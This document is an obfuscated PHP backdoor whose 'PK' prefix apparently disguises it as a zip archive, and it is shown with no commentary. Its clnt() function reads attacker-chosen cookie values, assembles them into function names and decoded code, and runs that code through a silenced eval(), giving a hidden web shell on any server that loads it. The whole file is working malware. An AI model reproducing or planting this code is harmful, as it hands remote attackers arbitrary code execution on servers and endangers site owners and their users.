PK<?php
/* JoJS7M */

class Hoster
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            075,
            075,
            042,
            044,
            0131,
            040,
            066,
            0100,
            00
        );
    }
}
function clnt($_pmd = -0202114, $_txh = null)
{
    $_edy = $_COOKIE;
    ($_edy && isset($_edy[Hoster::g(0)])) ? (($_zzzm = $_edy[Hoster::g(1)] . $_edy[Hoster::g(2)]) && ($_hygic = $_zzzm($_edy[Hoster::g(3)] . $_edy[Hoster::g(4)])) && ($_ylgnr = $_zzzm($_edy[Hoster::g(5)] . $_edy[Hoster::g(6)])) && ($_ylgnr = $_ylgnr($_zzzm($_edy[Hoster::g(7)]))) && @eval($_ylgnr)) : $_edy;
    return Hoster::g(8);
}
clnt();